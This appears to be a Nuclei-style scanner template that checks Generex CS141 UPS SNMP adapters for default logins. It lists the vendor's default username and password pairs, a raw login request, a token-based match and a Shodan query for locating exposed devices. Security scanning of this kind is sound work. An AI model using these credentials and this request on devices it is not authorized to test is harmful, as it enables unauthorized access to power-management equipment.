id: cs141-default-login
info:
  name: UPS Adapter CS141 SNMP Module Default Login
  author: socketz
  severity: medium
  description: UPS Adapter CS141 SNMP Module default login credentials were discovered.
  reference:
    - https://www.generex.de/media/pages/packages/documents/manuals/f65348d5b6-1628841637/manual_CS141_en.pdf
  classification:
    cwe-id: CWE-798
    cpe: cpe:2.3:h:generex:cs141:*:*:*:*:*:*:*:*
  metadata:
    runzero-match: service["http.body"] matches "CS141"
    max-request: 3
    product: cs141
    shodan-query: http.html:"CS141"
    vendor: generex
  tags: default-login,hiawatha,iot,vuln
http:
  - attack: pitchfork
    extractors:
      - kval:
          - accessToken
        type: kval
    matchers:
      - condition: and
        part: header
        type: word
        words:
          - accessToken
          - application/json
      - condition: and
        part: body
        type: word
        words:
          - accessToken
          - AdminFirstTime
      - status:
          - 200
        type: status
    matchers-condition: and
    payloads:
      pass:
        - cs141-snmp
        - engineer
        - guest
      user:
        - admin
        - engineer
        - guest
    raw:
      - |
        POST /api/login HTTP/1.1
        Host: {{Hostname}}
        Accept: application/json, text/plain, */*
        Content-Type: application/json

        {"userName":"{{user}}","password":"{{pass}}"}
    stop-at-first-match: true
